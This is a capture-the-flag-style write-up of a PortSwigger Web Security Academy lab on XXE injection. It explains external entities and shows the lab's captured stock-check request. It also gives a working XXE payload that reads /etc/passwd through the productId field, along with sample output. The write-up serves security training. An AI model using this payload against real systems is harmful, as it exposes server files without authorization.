## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/20653fe0-5306-47de-9852-879d7a9ae6ae)


## Overview :

#### Exploiting XXE to retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a **DOCTYPE element that defines an external entity** containing the path to the file.
- **Edit a data value in the XML that is returned in the application's response**, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe`; whose value is the contents of the `/etc/passwd` file and uses the entity within the productId value. This causes the application's response to include the contents of the file:

```xml
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Solution :

Click on one of the products & click the **checkstock** feature which is vulnerable to XXE.

The browser sends the following request.


```xml
POST /product/stock HTTP/1.1
Host: 0aa400220400046b804f17dc00d300c4.web-security-academy.net
Cookie: session=Nv6CS6L5nmAanBB776yX56ZFN4LVWnHm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0aa400220400046b804f17dc00d300c4.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0aa400220400046b804f17dc00d300c4.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

We can see that there is only 2 inputs that is passed via xml ie - **productID & storeID**.

First we declare a DOCTYPE with an external entity called xxe which retrieves the file _/etc/passwd_ - `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` 

We can now try to reference the entity in any of the 2 inputs to see which retreives the  /etc/passwd file & displays the content in the response.

**Payload**

Since the productID value is returned in response, we refer the entitiy in between the <productID> tags.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f85fbf17-31a9-4845-9a85-818510ec1cd9)

Thus we've solved the lab.
  
 ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6d811789-e3c0-4300-8978-e855a473d929)





















